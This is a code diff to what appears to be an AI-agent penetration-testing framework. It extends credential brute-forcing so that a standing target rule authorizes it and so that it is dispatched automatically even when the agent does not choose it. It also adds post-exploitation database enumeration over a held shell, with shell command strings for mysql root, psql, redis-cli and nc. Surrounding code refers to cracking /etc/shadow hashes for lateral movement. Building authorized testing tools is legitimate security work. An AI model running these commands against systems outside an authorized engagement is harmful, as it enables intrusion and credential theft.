@@ -827,19 +827,33 @@ def scan(state: PentestState) -> dict:
     # Without it they stay out, exactly as before. Both tools remain scope-gated
     # and MAX_CONCURRENT_SCANS-bounded in their own bodies.
     creds_enabled = False
+    _creds_auth = ""
     if auto:
         preapproved, _eid = _engagement_preapproval(sid)
-        if preapproved:
+        _rule_name = None
+        if not preapproved:
+            # A standing approval rule for this target ("approve everything for
+            # this IP", e.g. msf_home) is the operator's advance authorization
+            # too — the same reasoning that lets it skip the exploit interrupt.
+            # Without this, exploits auto-ran via the rule but password guessing
+            # never became available, so credential testing silently never ran.
+            try:
+                _rule_name, _ = _target_rule_preapproval(sid)
+            except Exception:  # noqa: BLE001
+                _rule_name = None
+        if preapproved or _rule_name:
             names = names | SCAN_TOOLS_CREDENTIAL
             creds_enabled = True
+            _creds_auth = ("operator pre-approval" if preapproved
+                           else f"standing rule '{_rule_name}'")
 
     system = _SCAN_SYSTEM_DISPATCH if auto else _SCAN_SYSTEM_PLAN
     try:
         # Say the credential tools exist when they do. A tool the agent is never
         # told about tends not to get chosen: the previous run had ftp, ssh,
         # telnet and vnc open and still ran no credential check.
-        cred_note = ("\nCredential testing IS authorised for this engagement "
-                     "(operator pre-approval). If you find authentication "
+        cred_note = (f"\nCredential testing IS authorised for this target "
+                     f"({_creds_auth}). If you find authentication "
                      "services — ftp, ssh, telnet, smb, vnc, rdp, mysql, "
                      "postgres — run start_credential_check on them, and "
                      "start_brutus where a wordlist attack is warranted. Both "
@@ -852,6 +866,30 @@ def scan(state: PentestState) -> dict:
                                  recursion_limit=(24 if auto
                                                   else PHASE_STEP_BUDGET["Scanner"]))
         dispatched = sorted({t for t in used if t.startswith("start_")})
+
+        # DETERMINISTIC credential testing. Same reasoning as the concrete-test
+        # plan below: the model must not be the reason password guessing never
+        # happens. At dispatch time the port scan has not finished, so "if you
+        # find auth services, test them" has nothing to act on and the model
+        # skips it — so when credential testing is authorised, dispatch it here
+        # on the auth services ALREADY known open (scope-gated + rate-bounded in
+        # the tool body). Skip if the model already ran it.
+        if creds_enabled and "start_credential_check" not in used:
+            try:
+                _auth_svcs = _discovered_auth_services(target)
+                if _auth_svcs:
+                    scan_tools.start_credential_check(
+                        targets=target, services=",".join(_auth_svcs))
+                    dispatched = sorted(set(dispatched) | {"start_credential_check"})
+                    _msg(sid, "Scanner",
+                         f"[credential testing] Authorised ({_creds_auth}); "
+                         f"dispatched start_credential_check on discovered auth "
+                         f"service(s): {', '.join(_auth_svcs)} — default/weak "
+                         f"password check (scope-gated, rate-bounded).",
+                         role="system")
+            except Exception as _ce:  # noqa: BLE001
+                _log.warning("[%s] deterministic credential check failed: %s", sid, _ce)
+
         # Append the deterministic plan regardless of what the model produced.
         # Observed twice on one afternoon: the scan agent was rate-limited (429)
         # and fell back, then on the retry it ran fine, never called
@@ -917,6 +955,39 @@ def _tls_state(service: str, product: str = "", banner: str = "") -> str:
 # How many distinct (service, port) pairs the deterministic planner will build
 # tests for. Bounded because each one is an HTTP call to the recommender.
 _DETERMINISTIC_PLAN_LIMIT = 8
+
+
+_AUTH_SVC_MAP = {
+    "ssh": "ssh", "ftp": "ftp", "telnet": "telnet", "mysql": "mysql",
+    "postgresql": "postgres", "postgres": "postgres", "vnc": "vnc",
+    "smb": "smb", "microsoft-ds": "smb", "netbios-ssn": "smb",
+    "ms-wbt-server": "rdp", "rdp": "rdp", "http-proxy": "", "tomcat": "tomcat",
+    "mongodb": "mongodb", "redis": "redis",
+}
+
+
+def _discovered_auth_services(target: str):
+    """Credential-check service names for the auth services already discovered
+    open on this target (from the ports table). Deterministic input to credential
+    testing — no dependency on the model 'seeing' the services."""
+    try:
+        from db_utils import get_db
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute(
+                "SELECT DISTINCT lower(p.service) FROM ports p "
+                "JOIN assets a ON p.asset_id = a.id "
+                "WHERE host(a.ip) = %s AND COALESCE(p.is_open, true) "
+                "  AND p.service IS NOT NULL", (str(target).split('/')[0],))
+            svcs = {r[0] for r in cur.fetchall()}
+        out = set()
+        for sv in svcs:
+            mapped = _AUTH_SVC_MAP.get((sv or "").strip())
+            if mapped:
+                out.add(mapped)
+        return sorted(out)
+    except Exception as e:  # noqa: BLE001
+        _log.debug("auth-service discovery failed for %s: %s", target, e)
+        return []
 
 
 def _build_test_plan(_unused_target: str = "") -> "tuple[str, int]":
@@ -2015,6 +2086,15 @@ def post_enumeration(state: PentestState) -> dict:
                  f"[loot] /etc/shadow: {loot['hashes']} hash(es) harvested, "
                  f"{loot.get('cracked', 0)} cracked to plaintext via offline hashcat "
                  f"— stored as credentials for reuse/lateral movement.")
+        # DETECTION-TRIGGERED STEP: a DB listening only on loopback is reachable
+        # only through this host — enumerate it locally via the shell when found.
+        dbenum = _enumerate_local_databases(sid, target, through.get("steps"))
+        if dbenum.get("dbs"):
+            findings.append(
+                f"post_enumeration: detected {len(dbenum['dbs'])} local-only "
+                f"database(s) ({', '.join(dbenum['dbs'])}) — ran {dbenum.get('ran', 0)} "
+                f"local DB enumeration command(s) through the held shell"
+                + (f" [{dbenum['reason']}]" if dbenum.get('reason') else ""))
     elif through.get("reason"):
         findings.append(f"post_enumeration: {through['reason']}")
 
@@ -2342,6 +2422,89 @@ def _harvest_shell_loot(sid, target: str, steps: list) -> dict:
                 out["revalidate_error"] = str(e)[:160]
     except Exception as e:  # noqa: BLE001
         out["error"] = str(e)[:160]
+    return out
+
+
+# Local (loopback-bound) DB services worth enumerating THROUGH a held shell —
+# they are unreachable externally, so an external scan never sees them, but a
+# shell can query them locally (often as root with no password). Read-only.
+_LOCAL_DB_PROBES = {
+    "mysql": {"ports": {3306}, "procs": ("mysql", "mariadb"), "cmds": [
+        ("db_mysql", "Local MySQL/MariaDB databases + users",
+         "mysql -u root -N -e 'SELECT version(); SHOW DATABASES; "
+         "SELECT user,host FROM mysql.user;' 2>&1 | head -80")]},
+    "postgres": {"ports": {5432}, "procs": ("postgres", "postmaster"), "cmds": [
+        ("db_postgres", "Local PostgreSQL databases + roles",
+         "(psql -U postgres -tAc 'SELECT version()' 2>&1; psql -U postgres -l 2>&1; "
+         "psql -U postgres -tAc 'SELECT rolname FROM pg_roles' 2>&1) | head -80")]},
+    "mongodb": {"ports": {27017}, "procs": ("mongod",), "cmds": [
+        ("db_mongo", "Local MongoDB databases",
+         "mongosh --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 "
+         "|| mongo --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 | head -60")]},
+    "redis": {"ports": {6379}, "procs": ("redis",), "cmds": [
+        ("db_redis", "Local Redis info + keys",
+         "(redis-cli INFO server 2>&1; redis-cli DBSIZE 2>&1; "
+         "redis-cli --scan 2>&1 | head -20) | head -80")]},
+    "memcached": {"ports": {11211}, "procs": ("memcached",), "cmds": [
+        ("db_memcached", "Local memcached stats",
+         "printf 'stats\\r\\nquit\\r\\n' | nc -w1 127.0.0.1 11211 2>&1 | head -40")]},
+}
+
+
+def _loopback_db_services(listen_out):
+    """DB service keys listening ONLY on loopback (127.x / ::1), from ss/netstat."""
+    import re as _re
+    found = {}
+    for line in (listen_out or "").splitlines():
+        line = _re.sub(r"^\S+@\S+:[^#]*#\s*", "", line).strip()
+        parts = line.split()
+        if len(parts) < 3 or not parts[0].isdigit() or ":" not in parts[2]:
+            continue
+        addr, _, ps = parts[2].rpartition(":")
+        if not ps.isdigit():
+            continue
+        al = addr.strip().lower().strip("[]")
+        if not (al.startswith("127.") or al in ("::1", "localhost")):
+            continue
+        port = int(ps)
+        pm = _re.search(r'users:\(\("([^"]+)"', line)
+        proc = (pm.group(1) if pm else "").lower()
+        for svc, spec in _LOCAL_DB_PROBES.items():
+            if port in spec["ports"] or any(t in proc for t in spec["procs"]):
+                found[svc] = port
+    return found
+
+
+def _enumerate_local_databases(sid, target, steps):
+    """Detection-triggered post-ex STEP: a database bound to loopback (127.x/::1)
+    is unreachable from an external scan, but we hold a shell. Detect such DB
+    ports in the listening-services output and, ONLY when one is present, run
+    READ-ONLY local enumeration for it through the shell. Mirrors
+    _harvest_shell_loot (a follow-up gated on what enumeration found). Returns
+    {"dbs": [...], "ran": N}."""
+    out = {"dbs": [], "ran": 0}
+    try:
+        listen = next((stp.get("output", "") for stp in (steps or [])
+                       if stp.get("step") == "listen"), "")
+        dbs = _loopback_db_services(listen)
+        if not dbs:
+            return out                       # detection: nothing local-only, no trigger
+        out["dbs"] = sorted(dbs.keys())
+        from etl import access as ax
+        best = ax.best_for(target)
+        if not best:
+            out["reason"] = "local-only DB(s) detected but no live shell to reach them"
+            return out
+        for svc in dbs:
+            for _sid_step, title, cmd in _LOCAL_DB_PROBES[svc]["cmds"]:
+                res = ax.run(best, cmd)
+                if res.get("ok"):
+                    out["ran"] += 1
+                _msg(sid, "PostEnumeration",
+                     f"[local db · {title}] {cmd}\n{(res.get('output') or '')[:1200]}")
+    except Exception as e:  # noqa: BLE001
+        out["error"] = str(e)[:160]
+        _log.debug("[%s] local-db enumeration failed: %s", sid, e)
     return out
 
 
